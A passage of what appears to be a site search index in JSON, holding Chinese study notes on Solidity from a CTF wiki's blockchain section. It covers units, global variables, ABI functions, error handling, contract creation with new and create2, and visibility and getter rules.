<li>\u5bf9\u4e8e\u6620\u5c04\u662f\u6ca1\u6709\u7528\u7684</li> </ul> </li> <li>\u4f18\u5148\u7ea7\u548c\u5176\u5b83\u8bed\u8a00\u7c7b\u4f3c</li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_9","title":"\u5355\u4f4d\u548c\u7279\u6b8a\u53d8\u91cf\u3001\u51fd\u6570","text":""},{"location":"ctf/blockchain/eth/solidity/#_10","title":"\u5355\u4f4d","text":"<ul> <li>\u4ee5\u592a\u5e01\u5355\u4f4d\uff1a<ul> <li>1 wei == 1</li> <li>1 gwei == 1e9</li> <li>1 ether == 1e18</li> <li>finney szabo \u5728 0.7.0 \u4e2d\u5220\u6389\u4e86</li> </ul> </li> <li>\u65f6\u95f4\u5355\u4f4d\uff1a<ul> <li>1 seconds == 1</li> <li>1 minutes == 60 seconds == 60</li> <li>1 hours == 60 minutes == 3600</li> <li>1 days == 24 hours == 86400</li> <li>1 weeks == 7 days == 604800</li> <li>\u7531\u4e8e\u95f0\u5e74\uff0cyears \u5728 0.5.0 \u4e2d\u5220\u6389\u4e86</li> <li>\u7531\u4e8e\u95f0\u79d2\uff0c\u65f6\u95f4\u53ef\u80fd\u4e0d\u7cbe\u51c6</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_11","title":"\u7279\u6b8a\u53d8\u91cf\u3001\u51fd\u6570","text":"<ul> <li>\u533a\u5757\u3001\u4ea4\u6613\u76f8\u5173<ul> <li>block \u76f8\u5173\u53d8\u91cf\uff1a<ul> <li>block.basefee\u3001block.chainid\u3001block.difficulty\u3001block.gaslimit\u3001block.number\u3001block.timestamp\uff1auint</li> <li>block.coinbase\uff1aaddress payable</li> </ul> </li> <li>\u4ea4\u6613\u3001\u6d88\u606f\u76f8\u5173\u53d8\u91cf\uff1a<ul> <li>msg.data\uff08bytes calldata\uff09\u3001msg.sender\uff08address\uff09\u3001msg.sig\uff08bytes4\uff09\u3001msg.value\uff08uint\uff09</li> <li>tx.gasprice\uff08uint\uff09\u3001tx.origin\uff08address\uff09</li> </ul> </li> <li>\u51fd\u6570<ul> <li>blockhash(uint blockNumber) returns (bytes32)\uff1a\u6700\u8fd1 256 \u5757\u8fd4\u56de\u54c8\u5e0c\uff0c\u4e4b\u524d\u7684\u8fd4\u56de 0</li> <li>gasleft() returns (uint256)\uff1a\u5f53\u524d\u5269\u4f59\u7684 gas</li> </ul> </li> </ul> </li> <li>ABI \u7f16\u89e3\u7801<ul> <li>abi.decode(bytes memory encodedData, (...)) returns (...)\uff1aABI \u89e3\u7801\u6570\u636e\u5f97\u5230\u53c2\u6570     <pre><code>(uint a, uint[2] memory b, bytes memory c) = abi.decode(data, (uint, uint[2], bytes))\n</code></pre></li> <li>abi.encode(...) returns (bytes memory)\uff1aABI \u7f16\u7801</li> <li>abi.encodedPacked(...) returns (bytes memory)\uff1a\u6253\u5305\u7f16\u7801</li> <li>abi.encodeWithSelector(bytes4 selector, ...) returns (bytes memory)\uff1a\u5bf9\u540e\u9762\u53c2\u6570\u8fdb\u884c\u7f16\u7801\uff0c\u7136\u540e\u5f00\u5934\u52a0\u4e0a selector</li> <li>abi.encodeWithSignature(string memory signature, ...) returns (bytes memory)\uff1a\u7b49\u4ef7\u4e8e\u5148\u5c06\u7b7e\u540d\u8ba1\u7b97\u5f97\u5230 selector \u7136\u540e\u518d\u8c03\u7528 encodeWithSelector</li> <li>abi.encodeCall(function functionPointer, (...)) returns (bytes memory)\uff1a\u68c0\u67e5\u7c7b\u578b\uff0c\u5e76\u7f16\u7801</li> </ul> </li> <li>\u9519\u8bef\u5904\u7406<ul> <li>assert(bool condition)\uff1a\u5982\u679c condition \u4e0d\u4e3a true \u5219\u629b\u51fa Panic \u9519\u8bef\u7136\u540e revert\uff08\u7528\u4e8e\u5185\u90e8\u9519\u8bef\uff09</li> <li>require(bool condition)\uff1a\u5982\u679c condition \u4e0d\u4e3a true \u5219 revert\uff08\u7528\u4e8e\u5916\u90e8\u9519\u8bef\uff09</li> <li>require(bool condition, string memory message)\uff1a\u540c\u4e0a\uff0c\u9519\u8bef\u65f6\u63d0\u4f9b\u4fe1\u606f</li> <li>revert()\uff1a\u7ec8\u6b62\u6267\u884c\u5e76 revert \u72b6\u6001\u66f4\u6539</li> <li>revert(string memory reason)\uff1a\u540c\u4e0a\uff0c\u4f46\u63d0\u4f9b\u4fe1\u606f</li> </ul> </li> <li>\u6570\u5b66\u548c\u5bc6\u7801\u5b66\u51fd\u6570<ul> <li>addmod(uint x, uint y, uint k) returns (uint)\uff1a\u8ba1\u7b97 (x + y) % k<ul> <li>0.5.0 \u540e\u4f1a assert(k != 0)</li> </ul> </li> <li>mulmod(uint x, uint y, uint k) returns (uint)\uff1a\u8ba1\u7b97 (x * y) % k<ul> <li>0.5.0 \u540e\u4f1a assert(k != 0)</li> </ul> </li> <li>keccak256(bytes memory) returns (bytes32)\uff1a\u8ba1\u7b97 keccak-256 \u54c8\u5e0c<ul> <li>0.5.0 \u4e4b\u524d\u6709\u522b\u540d sha3\uff0c\u540e\u9762\u79fb\u9664\u4e86</li> </ul> </li> <li>sha256(bytes memory) returns (bytes32)\uff1a\u8ba1\u7b97 sha-256 \u54c8\u5e0c</li> <li>ripemd160(bytes memory) returns (bytes20)\uff1a\u8ba1\u7b97 ripemd-160 \u54c8\u5e0c</li> <li>ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) returns (address)\uff1a\u4ece\u5706\u9525\u66f2\u7ebf\u7b7e\u540d\u4e2d\u6062\u590d\u4e0e\u516c\u94a5\u5173\u8054\u7684\u5730\u5740\uff0c\u51fa\u9519\u65f6\u8fd4\u56de 0<ul> <li>r \u662f\u524d\u9762 ECDSA \u503c\u7684\u524d 32 \u5b57\u8282\uff0cs \u662f\u63a5\u4e0b\u6765\u7684 32 \u5b57\u8282\uff0cv \u662f\u6700\u540e\u4e00\u5b57\u8282</li> </ul> </li> </ul> </li> <li>\u5408\u7ea6\u76f8\u5173<ul> <li>this\uff1a\u6307\u5f53\u524d\u5408\u7ea6</li> <li>selfdestruct(address payable recipient)\uff1a\u81ea\u6bc1\u5408\u7ea6\u5e76\u5c06\u6240\u6709\u4f59\u989d\u8f6c\u79fb\u7ed9 recipient<ul> <li>\u4f1a\u5f3a\u5236\u8f6c\u8d26\uff0c\u4e0d\u4f1a\u8fdb\u5165\u63a5\u6536\u65b9\u7684 receive \u51fd\u6570</li> <li>\u4ea4\u6613\u7ed3\u675f\u540e\u624d\u4f1a\u6467\u6bc1\uff0c\u5982\u679c revert \u4e86\u4f1a\u64a4\u9500\u9500\u6bc1</li> <li>0.5.0 \u4e4b\u524d\u6709\u522b\u540d suicide\uff0c\u540e\u9762\u79fb\u9664\u4e86</li> </ul> </li> </ul> </li> <li>\u7c7b\u578b\u4fe1\u606f<ul> <li>\u5bf9\u4e8e\u5408\u7ea6\uff1a<ul> <li>type(C).name\uff1a\u5408\u7ea6\u540d\u79f0</li> <li>type(C).creationCode\uff1a\u5185\u8054\u6c47\u7f16\u4e2d\u6709\u7528\uff0c\u65e0\u6cd5\u5728\u5408\u7ea6\u81ea\u8eab\u4e2d\u8bbf\u95ee\u8fd9\u4e2a\u5c5e\u6027</li> <li>type(C).runtimeCode\uff1a\u8fd0\u884c\u65f6\u5b57\u8282\u7801</li> </ul> </li> <li>\u5bf9\u4e8e\u63a5\u53e3\uff1a<ul> <li>type(I).interfaceId\uff1aEIP-165 \u89c4\u5b9a\u7684\u63a5\u53e3\u6807\u8bc6\u7b26\u503c</li> </ul> </li> <li>\u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff1a<ul> <li>type(T).min\u3001type(T).max</li> </ul> </li> </ul> </li> <li>\u4fdd\u7559\u5173\u952e\u5b57<ul> <li>after, alias, apply, auto, byte, case, copyof, default, define, final, implements, in, inline, let, macro, match, mutable, null, of, partial, promise, reference, relocatable, sealed, sizeof, static, supports, switch, typedef, typeof, var</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_12","title":"\u8bed\u53e5\u548c\u63a7\u5236\u7ed3\u6784","text":""},{"location":"ctf/blockchain/eth/solidity/#_13","title":"\u63a7\u5236\u7ed3\u6784","text":"<ul> <li>\u548c\u5176\u4ed6\u8bed\u8a00\u4e00\u6837\u63d0\u4f9b\u4e86\u63a7\u5236\u6d41\u76f8\u5173\u7684\u8bed\u53e5\uff1a<ul> <li>if-else<ul> <li>\u4e0d\u80fd\u7701\u7565\u6761\u4ef6\u7684\u5c0f\u62ec\u53f7\uff0c\u53ea\u6709\u4e00\u4e2a\u8bed\u53e5\u65f6\u53ef\u4ee5\u7701\u7565\u5927\u62ec\u53f7</li> <li>\u6761\u4ef6\u5fc5\u987b\u662f\u5e03\u5c14\u7c7b\u578b\uff0c\u56e0\u4e3a solidity \u6ca1\u6709\u5728\u975e\u5e03\u5c14\u7c7b\u578b\u548c\u5e03\u5c14\u7c7b\u578b\u4e4b\u95f4\u7684\u8f6c\u6362</li> </ul> </li> <li>while\u3001do\u3001for\u3001break\u3001continue</li> <li>return</li> </ul> </li> <li>\u540c\u65f6\u63d0\u4f9b\u4e86 try-catch \u8bed\u53e5\uff0c\u4e0d\u8fc7\u53ea\u80fd\u7528\u4e8e\u5916\u90e8\u51fd\u6570\u8c03\u7528\u6216\u8005\u5408\u7ea6\u521b\u5efa\u8bed\u53e5\u4e2d</li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_14","title":"\u51fd\u6570\u8c03\u7528","text":"<ul> <li>\u5185\u90e8\u51fd\u6570\u8c03\u7528\u76f4\u63a5\u5199\u51fd\u6570\u540d\u5e76\u8c03\u7528\u5373\u53ef<ul> <li>\u4e5f\u53ef\u4ee5\u8fdb\u884c\u9012\u5f52\u8c03\u7528\uff0c\u4e0d\u8fc7\u6808\u6df1\u5ea6\u6700\u591a 1024 \u63d2\u69fd\uff0c\u53ef\u80fd\u4f1a\u7206\u6808</li> </ul> </li> <li>\u5916\u90e8\u51fd\u6570\u8c03\u7528\uff0c\u4f7f\u7528 this.f(...) \u6216 c.f(...)<ul> <li>this \u6307\u5f53\u524d\u5408\u7ea6\uff0c\u5373\u901a\u8fc7\u5916\u90e8\u8c03\u7528\u7684\u65b9\u5f0f\u8c03\u7528\u81ea\u8eab\u51fd\u6570</li> <li>c \u6307\u5408\u7ea6\u5b9e\u4f8b\uff0cf \u662f c \u4e2d\u7684\u51fd\u6570</li> <li>\u53ef\u4ee5\u9644\u52a0 gas \u548c value\uff0c\u5728\u51fd\u6570\u540d\u540e\u3001\u62ec\u53f7\u524d\u589e\u52a0\u5373\u53ef\uff1a     <pre><code>c.f{value: ..., gas: ...}(...)\n</code></pre></li> <li>\u5982\u679c\u88ab\u8c03\u7528\u7684\u51fd\u6570\u4e2d\u4ea7\u751f\u4e86\u5f02\u5e38\uff0c\u5219\u6574\u4e2a\u8c03\u7528\u4e5f\u662f\u5f02\u5e38\u7684</li> </ul> </li> <li>\u901a\u8fc7\u53c2\u6570\u540d\u79f0\u8c03\u7528\u51fd\u6570     <pre><code>function set(uint key, uint value) public {\n    data[key] = value;\n}\nfunction f() public {\n    set({value: 2, key: 3});\n}\n</code></pre></li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#new","title":"\u901a\u8fc7 new \u521b\u5efa\u5408\u7ea6","text":"<ul> <li>\u5728\u5408\u7ea6\u4e2d\u4e5f\u53ef\u4ee5\u901a\u8fc7 new \u521b\u5efa\u53e6\u4e00\u4e2a\u5408\u7ea6     <pre><code>D newD = new D(arg);\nD newD = new D{value: amount}(arg);\n</code></pre><ul> <li>\u5982\u679c D \u7684 constructor \u662f payable \u7684\u8bdd\uff0c\u53ef\u4ee5\u5728\u521b\u5efa\u65f6\u4f20\u5165\u4ee5\u592a\u5e01</li> <li>\u5982\u679c\u521b\u5efa\u5931\u8d25\uff0c\u5219\u4f1a\u629b\u51fa\u5f02\u5e38</li> </ul> </li> <li>\u52a0\u76d0\u521b\u5efa\uff08\u5373\u4f7f\u7528 create2 \u521b\u5efa\uff09<ul> <li>\u524d\u9762\u7684\u521b\u5efa\u65b9\u5f0f\u4f7f\u7528 create \u6307\u4ee4\uff0c\u5730\u5740\u7531\u521b\u5efa\u8005\u5730\u5740\u548c nonce \u8ba1\u7b97</li> <li>\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a salt\uff08\u4e00\u4e2a bytes32 \u503c\uff09\u7684\u65b9\u5f0f\u6765\u4f7f\u7528 create2 \u6307\u4ee4\u7684\u673a\u5236\u521b\u5efa\u5408\u7ea6     <pre><code>D newD = new D{salt: salt}(arg);\n</code></pre></li> <li>\u5730\u5740\u7684\u8ba1\u7b97\u65b9\u5f0f\u662f\uff1a     <pre><code>address predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(\n    bytes1(0xff),\n    address(this),\n    salt,\n    keccak256(abi.encodePacked(\n        type(D).creationCode,\n        abi.encode(arg)\n    ))\n)))));\n</code></pre></li> <li>\u56e0\u4e3a\u5730\u5740\u7684\u8ba1\u7b97\u4e0e nonce \u548c runtimeCode \u65e0\u5173\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u539f\u5730\u5740\u5408\u7ea6\u88ab\u9500\u6bc1\u540e\u91cd\u65b0\u5728\u5176\u5730\u5740\u4e0a\u90e8\u7f72\u65b0\u7684\u5408\u7ea6\uff08\u53ea\u8981\u4fdd\u8bc1 creationCode\u3001salt\u3001arg \u4e00\u81f4\u5c31\u53ef\u4ee5\u5728\u540c\u4e00\u4f4d\u7f6e\u521b\u5efa\u5408\u7ea6\uff09</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_15","title":"\u8d4b\u503c\u8bed\u53e5\u53ca\u4f5c\u7528\u57df","text":"<ul> <li>\u8d4b\u503c\u8bed\u53e5\u53ef\u4ee5\u81ea\u52a8\u89e3\u5305\u591a\u4e2a\u503c\uff0c\u4e5f\u53ef\u4ee5\u5728\u89e3\u5305\u8d4b\u503c\u65f6\u5b9a\u4e49\u53d8\u91cf\uff1a     <pre><code>contract C {\n    uint index;\n\n    function f() public pure returns (uint, bool, uint) {\n        return (7, true, 2);\n    }\n\n    function g() public {\n        (uint x, , uint y) = f();\n        (x, y) = (y, x);\n        (index, , ) = f(); // Sets the index to 7\n    }\n}\n</code></pre></li> <li>\u53d8\u91cf\u4f5c\u7528\u57df\u548c C99 \u7684\u89c4\u5b9a\u76f8\u540c\uff08\u5927\u62ec\u53f7\u5206\u9694\u7b49\uff09<ul> <li>0.5.0 \u4e4b\u524d\u4f7f\u7528 JavaScript \u7684\u4f5c\u7528\u57df\u89c4\u5219\uff0c\u5373\u4f5c\u7528\u57df\u5728\u6574\u4e2a\u8303\u56f4\u5185\u800c\u4e0d\u662f\u58f0\u660e\u4e4b\u540e<ul> <li>\u5982\u4e0b\u4ee3\u7801\u5728 0.5.0 \u4e4b\u524d\u53ef\u4ee5\u7f16\u8bd1\uff0c\u4e4b\u540e\u4f1a\u62a5\u9519\uff1a <pre><code>contract C {\n    function f() pure public returns (uint) {\n        x = 2;\n        uint x;\n        return x;\n    }\n}\n</code></pre></li> </ul> </li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#unchecked","title":"unchecked \u8bed\u53e5","text":"<ul> <li>\u5728 0.8.0 \u540e\uff0c\u4f1a\u68c0\u67e5\u6ea2\u51fa\uff0c\u5982\u679c\u53d1\u751f\u6ea2\u51fa\u5219\u4f1a\u5bfc\u81f4 assert \u9519\u8bef</li> <li>\u5728 0.8.0 \u540e\u4e0d\u68c0\u67e5\u6ea2\u51fa\u9700\u8981\u4f7f\u7528 unchecked \u5757\uff1a     <pre><code>contract C {\n    function f(uint a, uint b) pure public returns (uint) {\n        unchecked { return a - b; }\n    }\n    function g(uint a, uint b) pure public returns (uint) {\n        return a - b;\n    }\n}\n</code></pre><ul> <li>\u8c03\u7528 f(2, 3) \u4f1a\u8fd4\u56de 2**256-1\uff0c\u8c03\u7528 g(2, 3) \u4f1a\u5bfc\u81f4\u9519\u8bef</li> </ul> </li> <li>unchecked \u53ef\u4ee5\u5728\u5757\u5185\u7684\u4efb\u4f55\u4f4d\u7f6e\u4f7f\u7528\uff0c\u4e0d\u80fd\u5d4c\u5957</li> <li>\u53ea\u5bf9\u5f53\u524d\u5757\u5185\u7684\u8bed\u53e5\u6709\u6548\uff0c\u4ece unchecked \u5757\u5185\u8c03\u7528\u7684\u5916\u90e8\u51fd\u6570\u4e0d\u53d7\u5176\u5f71\u54cd</li> <li>\u4e0d\u80fd\u518d checked \u5757\u5185\u4f7f\u7528 _;\uff08modifier \u5b9a\u4e49\u65f6\uff09</li> <li>unchecked \u4e0d\u80fd\u4ec5\u7528\u9664\u4ee5\u96f6\u548c\u6a21\u96f6\u7684\u68c0\u67e5</li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_16","title":"\u9519\u8bef\u5904\u7406","text":"<ul> <li>solidity \u4f7f\u7528\u72b6\u6001\u56de\u6eda\u6765\u5904\u7406\u9519\u8bef\uff0c\u5373\u76f4\u63a5\u64a4\u9500\u5f53\u524d\u8c03\u7528\u53ca\u6240\u6709\u5b50\u8c03\u7528\u4e2d\u6240\u6709\u7684\u72b6\u6001\u66f4\u6539</li> <li>\u5b50\u8c03\u7528\u51fa\u73b0\u5f02\u5e38\u4e4b\u540e\u4f1a\u76f4\u63a5\u5411\u4e0a\u4f20\u9012\uff0c\u5373\u7ee7\u7eed\u5f02\u5e38\u9000\u51fa\uff0c\u9664\u975e\u88ab try-catch \u8bed\u53e5\u6355\u83b7<ul> <li>send\u3001call\u3001delegatecall\u3001staticcall \u51fa\u9519\u4e0d\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u800c\u4f1a\u8fd4\u56de false</li> <li>\u4f46\u662f\u5982\u679c\u8c03\u7528\u7684\u8d26\u6237\u4e0d\u5b58\u5728\u7684\u8bdd\uff0ccall\u3001delegatecall\u3001staticcall \u4ecd\u4f1a\u8fd4\u56de true\uff0c\u6240\u4ee5\u8981\u63d0\u524d\u68c0\u67e5</li> </ul> </li> <li>Panic<ul> <li>Panic \u662f assert \u8bed\u53e5\u5931\u8d25\u65f6\u629b\u51fa\u7684\u9519\u8bef\u7c7b\u578b</li> <li>assert \u629b\u51fa\u7684\u9519\u8bef\u7c7b\u578b\u65f6 Panic(uint256)\uff0c\u5176\u5305\u542b\u4e86\u9519\u8bef\u4ee3\u7801\uff1a<ul> <li>0x00\uff1a\u7f16\u8bd1\u5668\u63d2\u5165\u7684 panic</li> <li>0x01\uff1a\u624b\u52a8\u8c03\u7528 assert \u65f6\uff0c\u9a8c\u8bc1\u503c\u4e0d\u4e3a true</li> <li>0x11\uff1aunchecked \u5757\u5916\u51fa\u73b0\u4e86\u6ea2\u51fa</li> <li>0x12\uff1a\u9664\u4ee5\u96f6\u6216\u8005\u6a21\u96f6</li> <li>0x21\uff1a\u5c06\u8fc7\u5927\u7684\u503c\u6216\u8005\u8d1f\u503c\u8f6c\u6362\u4e3a\u679a\u4e3e</li> <li>0x22\uff1a\u8bbf\u95ee\u9519\u8bef\u7f16\u7801\u7684 storage \u5b57\u8282\u6570\u7ec4</li> <li>0x31\uff1a\u5bf9\u7a7a\u6570\u7ec4\u6267\u884c pop</li> <li>0x32\uff1a\u8d8a\u754c\u8bbf\u95ee\u6570\u7ec4</li> <li>0x41\uff1a\u5206\u914d\u4e86\u592a\u591a\u5185\u5b58\u6216\u8005\u521b\u5efa\u4e86\u8fc7\u5927\u6570\u7ec4</li> <li>0x51\uff1a\u8c03\u7528\u4e86\u5185\u90e8\u51fd\u6570\u7c7b\u578b\u7684\u96f6\u521d\u59cb\u5316\u51fd\u6570</li> </ul> </li> <li>assert \u5e94\u7528\u4e8e\u5185\u90e8\u68c0\u67e5\u9519\u8bef\uff0c\u6b63\u5e38\u8bbe\u8ba1\u8fd0\u884c\u7684\u7a0b\u5e8f\u4e0d\u5e94\u8be5\u4f1a\u629b\u51fa Panic</li> </ul> </li> <li>Error<ul> <li>Error \u662f require \u8bed\u53e5\u5931\u8d25\u65f6\u629b\u51fa\u7684\u9519\u8bef\u7c7b\u578b</li> <li>\u629b\u51fa\u7684\u9519\u8bef\u7c7b\u578b\u4e3a Error(string)<ul> <li>\u5373 require(x, s) \u4e2d x \u4e3a false \u65f6\u4f1a\u629b\u51fa Error(s)</li> </ul> </li> <li>require \u65e0\u6cd5\u4f7f\u7528\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b\uff0c\u53ef\u4ee5\u6539\u5199\u4e3a if (!condition) revert CustomError();</li> </ul> </li> <li>revert<ul> <li>revert \u53ef\u4ee5\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\u5e76\u56de\u6eda\uff0c\u524d\u9762\u7684 Panic \u548c Error \u5c31\u662f\u901a\u8fc7 revert \u629b\u51fa\u7684</li> <li>revert \u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b revert CustomError(arg1, arg2)</li> <li>\u4e3a\u4e86\u5411\u540e\u517c\u5bb9\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 revert \u51fd\u6570\uff1arevert() \u4ee5\u53ca revert(\"description\")</li> </ul> </li> <li>try-catch<ul> <li>try-catch \u8bed\u53e5\u53ef\u4ee5\u6355\u83b7\u524d\u9762\u8bf4\u5230\u7684\u9519\u8bef\uff1a <pre><code>try feed.getData(token) returns (uint v) {\n    return (v, true);\n} catch Error(string memory reason) {\n    ...\n} catch Panic(uint errorCode) {\n    ...\n} catch (bytes memory lowLevelData) {\n    ...\n}\n</code></pre></li> <li>Error(string memory reason) \u7528\u4e8e\u6355\u83b7 require \u6216\u8005 revert(\"...\") \u4ea7\u751f\u7684\u9519\u8bef</li> <li>Panic(uint errorCode) \u7528\u4e8e\u6355\u83b7 assert \u4ea7\u751f\u7684 Panic \u9519\u8bef</li> <li>catch (bytes memory lowLevelData) \u7528\u4e8e\u6355\u83b7\u5269\u4f59\u7684\u5176\u5b83\u9519\u8bef</li> <li>catch \u7528\u4e8e\u6355\u83b7\u6240\u6709\u5269\u4f59\u9519\u8bef\u5e76\u5ffd\u7565</li> <li>\u4e3a\u4e86\u6355\u83b7\u6240\u6709\u9519\u8bef\uff0c\u5e94\u8be5\u81f3\u5c11\u6709\u4e00\u53e5 catch { ... } \u6216 catch (bytes memory lowLevelData) { ... }</li> <li>\u5982\u679c\u5728 try-catch \u4e2d\u89e3\u7801\u8fd4\u56de\u503c\u65f6\u4ea7\u751f\u4e86\u9519\u8bef\uff0c\u5219\u4f1a\u4ece\u5f53\u524d\u5408\u7ea6\u5411\u4e0a\u629b\u51fa\u5f02\u5e38\uff0c\u800c\u4e0d\u4f1a\u8fdb\u5165\u4e0b\u9762\u7684 catch \u8bed\u53e5\u4e2d</li> <li>\u5982\u679c\u5728\u89e3\u7801 Error(string memory reason) \u65f6\u51fa\u73b0\u4e86\u9519\u8bef\uff0c\u4e14\u6709\u66f4\u4f4e\u7ea7\u7684 catch \u8bed\u53e5\uff0c\u5219\u4f1a\u8fdb\u5165\u66f4\u4f4e\u7ea7\u7684 catch \u4e2d</li> <li>\u5982\u679c\u5916\u90e8\u8c03\u7528\u7ed3\u675f\u540e\u8fbe\u5230\u4e86\u9519\u8bef\u5757\uff0c\u90a3\u4e48\u6b64\u65f6\u5916\u90e8\u8c03\u7528\u9020\u6210\u7684\u72b6\u6001\u4fee\u6539\u5df2\u7ecf\u88ab\u56de\u6eda\u4e86</li> <li>\u8c03\u7528\u65f6\u8c03\u7528\u8005\u4f1a\u4fdd\u7559\u81f3\u5c11 1/64 \u7684 gas\uff0c\u56e0\u6b64\u5373\u4f7f\u8c03\u7528\u56e0\u4e3a gas \u8017\u5c3d\u800c\u5931\u8d25\uff0c\u8c03\u7528\u8005\u4ecd\u7136\u6709\u5269\u4f59 gas \u53ef\u4ee5\u8fdb\u884c\u9519\u8bef\u5904\u7406</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_17","title":"\u5408\u7ea6","text":""},{"location":"ctf/blockchain/eth/solidity/#_18","title":"\u521b\u5efa\u5408\u7ea6","text":"<ul> <li>\u5f53\u5408\u7ea6\u521b\u5efa\u65f6\u4f1a\u6267\u884c constructor \u6784\u9020\u51fd\u6570</li> <li>\u53ef\u4ee5\u6ca1\u6709 constructor\uff0c\u6709\u7684\u8bdd\u53ea\u80fd\u6709\u4e00\u4e2a\uff0c\u4e0d\u652f\u6301\u91cd\u8f7d</li> <li>\u521b\u5efa\u5408\u7ea6\u65f6\u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u4f1a\u88ab\u7f16\u7801\u4e3a ABI \u7f16\u7801\u7684\u6570\u636e\uff0c\u7136\u540e\u653e\u5728\u5408\u7ea6\u7684\u540e\u9762</li> <li>\u5408\u7ea6\u4e2d\u521b\u5efa\u53e6\u4e00\u4e2a\u5408\u7ea6\u4e00\u5b9a\u8981\u77e5\u9053\u521b\u5efa\u5408\u7ea6\u7684\u6e90\u7801<ul> <li>\u56e0\u6b64\u4e0d\u80fd\u5faa\u73af\u521b\u5efa\u81ea\u8eab\u5408\u7ea6</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#getter","title":"\u53ef\u89c1\u6027\u548c getter","text":"<ul> <li>\u72b6\u6001\u53d8\u91cf\u53ef\u89c1\u6027<ul> <li>public\uff1a\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u521b\u5efa getter \u51fd\u6570<ul> <li>\u81ea\u8eab\u8c03\u7528\u65f6 this.x \u4f1a\u4f7f\u7528 getter\uff0c\u76f4\u63a5\u4f7f\u7528 x \u5219\u4e0d\u4f1a\u8c03\u7528 getter\uff08\u76f4\u63a5\u8bfb\u53d6\u63d2\u69fd\uff09</li> </ul> </li> <li>internal\uff08\u9ed8\u8ba4\u53ef\u89c1\u6027\uff09\uff1a\u53ea\u6709\u5408\u7ea6\u5185\u90e8\u53ef\u4ee5\u8bbf\u95ee\uff08\u5305\u62ec\u6d3e\u751f\u5408\u7ea6\uff09\uff0c\u6ca1\u6709 getter<ul> <li>\u53ea\u662f\u6ca1\u6709 getter\uff0c\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7 getStorageAt \u63d2\u69fd\u8bfb\u53d6</li> </ul> </li> <li>private\uff1a\u7c7b\u4f3c internal\uff0c\u4e0d\u8fc7\u5728\u6d3e\u751f\u5408\u7ea6\u4e2d\u4e0d\u53ef\u8bbf\u95ee</li> </ul> </li> <li>\u51fd\u6570\u53ef\u89c1\u6027<ul> <li>external\uff1a\u5408\u7ea6\u63a5\u53e3\u7684\u4e00\u90e8\u5206\uff0c\u667a\u80fd\u4ece\u5176\u4ed6\u5408\u7ea6\u6216\u8005\u4ea4\u6613\u4e2d\u8c03\u7528\uff0c\u4e0d\u80fd\u5185\u90e8\u8c03\u7528\uff08f() \u4e0d\u53ef\u4ee5\uff0c\u4f46 this.f() \u53ef\u4ee5\uff09</li> <li>public\uff1a\u5408\u7ea6\u63a5\u53e3\u7684\u4e00\u90e8\u5206\uff0c\u53ef\u4ee5\u4ece\u5176\u4ed6\u5408\u7ea6\u6216\u8005\u4ea4\u6613\u4e2d\u8c03\u7528\uff0c\u4e5f\u53ef\u4ee5\u5185\u90e8\u8c03\u7528</li> <li>internal\uff1a\u53ea\u80fd\u5728\u5408\u7ea6\u5185\u90e8\uff08\u5305\u62ec\u6d3e\u751f\u5408\u7ea6\uff09\u8c03\u7528\uff0c\u4e0d\u80fd\u4ece\u5916\u90e8\u8c03\u7528\uff0c\u4e0d\u4f1a\u66b4\u9732\u7ed9\u5916\u90e8</li> <li>private\uff1a\u7c7b\u4f3c internal\uff0c\u4e0d\u8fc7\u5728\u6d3e\u751f\u5408\u7ea6\u4e2d\u4e0d\u53ef\u7528</li> </ul> </li> <li>getter \u51fd\u6570<ul> <li>\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u4e3a\u6240\u6709 public \u72b6\u6001\u53d8\u91cf\u521b\u5efa getter \u51fd\u6570</li> <li>getter \u51fd\u6570\u7684\u53ef\u89c1\u6027\u662f external \u7684</li> <li>\u5bf9\u4e8e\u6570\u7ec4\u53d8\u91cf\uff0cgetter \u51fd\u6570\u662f\u8f93\u5165\u7d22\u5f15\u8fd4\u56de\u503c\uff08\u9632\u6b62\u8fc7\u9ad8\u7684 gas \u6d88\u8017\uff09<ul> <li>\u60f3\u8981\u8fd4\u56de\u6574\u4e2a\u6570\u7ec4\u7684\u8bdd\u9700\u8981\u81ea\u5df1\u5199\u53e6\u4e00\u4e2a\u51fd\u6570</li> </ul> </li> <li>\u4e00\u4e2a\u590d\u6742\u4f8b\u5b50\uff1a     <pre><code>contract Complex {\n    struct Data {\n        uint a;\n        bytes3 b;\n        mapping (uint =&gt; uint) map;\n        uint[3] c;\n        uint[] d;\n        bytes e;\n    }\n    mapping (uint =&gt; mapping(bool =&gt; Data[])) public data;\n}\n</code></pre><ul> <li>\u4e3a data \u751f\u6210\u7684 getter \u4e3a\uff1a <pre><code>function data(uint arg1, bool arg2, uint arg3)\n    public\n    returns (uint a, bytes3 b, bytes memory e)\n{\n    a = data[arg1][arg2][arg3].a;\n    b = data[arg1][arg2][arg3].b;\n    e = data[arg1][arg2][arg3].e;\n}\n</code></pre></li> <li>\u8fd4\u56de\u503c\u4f1a\u5ffd\u7565\u7ed3\u6784\u4f53\u4e2d\u7684 mapping\u3001\u6570\u7ec4</li> </ul> </li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_19","title":"\u51fd\u6570\u4fee\u6539\u5668","text":"<ul> 